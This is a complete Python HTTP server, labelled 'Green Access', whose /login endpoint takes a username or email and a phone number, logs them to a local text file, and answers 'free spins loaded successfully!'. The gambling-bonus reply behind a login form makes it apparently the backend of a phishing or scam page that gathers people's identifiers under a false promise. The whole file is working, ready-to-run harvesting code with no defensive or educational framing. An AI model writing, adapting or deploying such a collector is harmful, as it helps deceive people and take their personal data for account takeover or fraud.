
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from datetime import datetime
import json

BASE_DIR = Path(__file__).resolve().parent
RECORDS_FILE = BASE_DIR / "login_records.txt"


class LoginHandler(SimpleHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(
            *args,
            directory=str(BASE_DIR),
            **kwargs
        )

    def do_POST(self):
        if self.path != "/login":
            self.send_json(404, {"message": "Not found."})
            return

        try:
            length = int(self.headers.get("Content-Length", 0))

            if length <= 0 or length > 10000:
                self.send_json(
                    400,
                    {"message": "Invalid request size."}
                )
                return

            data = json.loads(self.rfile.read(length))

            username = data.get("username", "")
            phone = data.get("phone", "")

            if not isinstance(username, str):
                self.send_json(400, {"message": "Invalid username."})
                return

            if not isinstance(phone, str):
                self.send_json(400, {"message": "Invalid phone number."})
                return

            username = username.strip()
            phone = phone.strip()

            if not username or not phone:
                self.send_json(
                    400,
                    {"message": "Please complete both fields."}
                )
                return

            if (
                len(username) > 254
                or len(phone) > 30
                or any(c in username + phone for c in "\r\n|")
            ):
                self.send_json(
                    400,
                    {"message": "Please check the information entered."}
                )
                return

            timestamp = datetime.now().isoformat(
                timespec="seconds"
            )

            with RECORDS_FILE.open("a", encoding="utf-8") as file:
                file.write(
                    f"Time: {timestamp} | "
                    f"Email or Username: {username} | "
                    f"Phone Number: {phone}\n"
                )

            self.send_json(
                200,
                {"message": "free spins loaded successfully!"}
            )

        except (json.JSONDecodeError, UnicodeDecodeError):
            self.send_json(
                400,
                {"message": "Invalid request data."}
            )

        except OSError:
            self.send_json(
                500,
                {"message": "Could not save the record."}
            )

    def send_json(self, status, data):
        body = json.dumps(data).encode("utf-8")

        self.send_response(status)
        self.send_header(
            "Content-Type",
            "application/json; charset=utf-8"
        )
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    import os

    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(("0.0.0.0", port), LoginHandler)
    
    print(f"Green Access server running on port {port}")
    server.serve_forever()

